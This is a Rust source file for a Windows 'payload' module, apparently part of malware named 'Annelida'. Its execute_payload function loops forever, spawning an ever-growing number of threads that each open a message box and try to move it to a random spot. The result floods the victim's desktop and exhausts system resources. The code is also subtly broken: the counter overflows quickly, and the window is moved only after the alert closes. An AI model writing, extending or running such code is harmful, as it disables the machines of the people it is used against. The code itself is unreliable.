use std::thread;
use std::time::Duration;
use native_dialog::{MessageDialog, MessageType};
use winapi::um::winuser::{FindWindowA, SetWindowPos, SWP_NOSIZE};
use rand::Rng;

// Function to exponentially increase the number of windows that open
pub fn execute_payload() {
    let mut count: i32 = 1;
    loop {
        for _ in 1..count {
            thread::spawn(|| {
                message();
            });
        }
        count += 1;
        count *= count;
        thread::sleep(Duration::from_secs_f32(0.5));
    }
}

// Simple message box window with message for payload
fn message() {
    MessageDialog::new()
        .set_type(MessageType::Info)
        .set_title("Annelida")
        .set_text("Temporary payload message :3")
        .show_alert().unwrap();

    // Set the window position to a random location
    let hwnd = unsafe { FindWindowA(std::ptr::null(), "Annelida\0".as_ptr() as *const i8) };
    if !hwnd.is_null() {
        let mut rng = rand::thread_rng();
        let x = rng.gen_range(0..1920);
        let y = rng.gen_range(0..1080);
        unsafe {
            SetWindowPos(hwnd, std::ptr::null_mut(), x, y, 0, 0, SWP_NOSIZE);
        }
    }
}